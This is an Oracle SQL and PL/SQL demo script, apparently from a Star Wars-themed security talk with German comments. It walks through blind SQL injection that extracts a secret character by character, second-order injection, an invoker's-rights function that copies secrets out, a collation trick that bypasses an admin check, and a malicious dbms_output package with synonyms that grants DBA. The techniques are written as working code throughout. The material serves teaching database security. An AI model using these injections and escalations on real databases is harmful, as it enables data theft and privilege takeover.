/* Run as DEATHSTAR */
/* 1. Update Injection: Poison a data-table */

-- Deathstar-rooms before
select * from deathstar_rooms;

-- Inject with APEX

-- Deathstar-rooms after
select * from deathstar_rooms;

/* 2. Blind Injection */

--------------------------
-- --> Continue Darth Ora
--------------------------




select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''a'') --') from dual;
select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''b'') --') from dual;
select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''c'') --') from dual;

-- all ascii chars...
select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''v'') --') from dual;

declare
  l_secret varchar2(4000);

  function chk_char(i_idx integer)
    return varchar2
  as
    l_malicious_stmt varchar2(4000);
  begin
    for char_ascii in 1..90
      loop
        l_malicious_stmt :=
            ''') and exists(select 1 from imperial_secrets where id = 1 and' ||
            ' lower(substr(secret, ' || i_idx || ', 1)) = ''' || lower(chr(char_ascii)) || ''') --';
        --dbms_output.put_line(l_malicious_stmt);
        if (room_info.get_room_id(l_malicious_stmt) = 1) then
          return chr(char_ascii);
        end if;
      end loop;
    return '?';
  end;
begin
  begin
    for idx in 1..30
      loop
        l_secret := l_secret || chk_char(idx);
      end loop;
  exception
    when others then
      dbms_output.put_line(sqlerrm);
  end;
  dbms_output.put_line('Secret: ' || l_secret);
end;
/

/* 3. 2nd Order Attack */
--------------------------
-- --> Continue Darth Ora
--------------------------

-- Poisoned room-code
select code from deathstar_rooms;

-- Nothing strange to see...
select * from user_roles;

-- Just wait until someone gets access to the room!
call room_info.allow_room_access(2, 1);

-- Oh wow, Rebel has all the roles
select * from user_roles;

-- Nothing is shown in the logs
select * from log_201910;


/* 4. Invoker's rights  */
--------------------------
-- --> Continue Darth Ora
--------------------------


--------------------------
-- --> AS SCOTT
--------------------------
create table secret_dump (
  secret varchar2(4000),
  created timestamp default current_timestamp
);

create or replace function bad_func
  return varchar2 authid current_user -- Invoker's rights!
  as
    pragma autonomous_transaction;
  begin
		execute immediate 'insert into scott.secret_dump (secret) select secret from imperial_secrets';
		commit;
		return 'Y';
  end;
/

grant execute on bad_func to public;
grant insert on secret_dump to public;

-- Exploit SQL Injection
--------------------------------------
-- Deathstar hat ROOM_INFO für PUBLIC freigegeben
-- grant execute on room_info to public;

-- Exploit direkt als SCOTT
truncate table secret_dump;
select * from secret_dump;

select deathstar.room_info.get_room_id(''') and scott.bad_func() = ''Y''--') from dual;


select * from secret_dump;

/* 5. Variable Poisoning */
--------------------------
-- --> Continue Darth Ora
--------------------------

/* 6. Collation Attack */
ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC;

select is_admin('aDMIN') from dual;
select is_admin('Ädmin') from dual;

-- Wie kann das ausgenutzt werden?
-- LOGON-Trigger
-- Braucht Berechtigung

--------------------------
-- --> Continue Darth Ora
--------------------------

create or replace trigger trg_client_detection
after logon
on database
begin
	execute immediate 'ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC';
end;
/


--------------------------
-- --> AS DEATHSTAR
--------------------------
select is_admin('Ädmin') from dual;


/* 7. Synonym Attack */
--------------------------
-- --> AS SCOTT
--------------------------
create or replace package malicious_dbms_output authid current_user as
	procedure put_line( i_input varchar2 );
end;
/

create or replace package body malicious_dbms_output as

  procedure grant_us_dba
  as
    pragma autonomous_transaction;
    begin
      execute immediate 'grant dba to scott';
      sys.dbms_output.put_line('Granting succeeded!'); -- Diese würden im echten Fall natürlich ausgelassen!
    exception when others then
      sys.dbms_output.put_line('Granting DBA not succeeded: ' || sqlerrm); -- Diese würden im echten Fall natürlich ausgelassen!
      null;
    end;

  procedure put_line( i_input varchar2 )
  as
    begin
      grant_us_dba();
      sys.dbms_output.put_line(i_input);
    end;
end;
/

grant execute on malicious_dbms_output to public;

-- Prüfe aktuelle Rechte
select * from user_role_privs;

-- Hey DBA - ich bräuchte bitte CREATE ANY SYNONYM privilege weil tolles neues framework

--------------------------
-- --> Continue Darth Ora
--------------------------

select * from user_role_privs;

create synonym deathstar.dbms_output for malicious_dbms_output;
create synonym darth_dba.dbms_output for malicious_dbms_output;

-- User: Deathstar - Da funktioniert nichts, aber es wird auch nichts bemerkt
select deathstar.room_info.get_room_id('Vader') from dual;

-- Hey DBA - etwas funktioniert mit dem get_room_id nicht...
--------------------------
-- --> Continue Darth Ora
--------------------------


select * from user_role_privs;

-- Okay, jetzt sind wir DBA - jetzt können wir den Todesstern zerstören...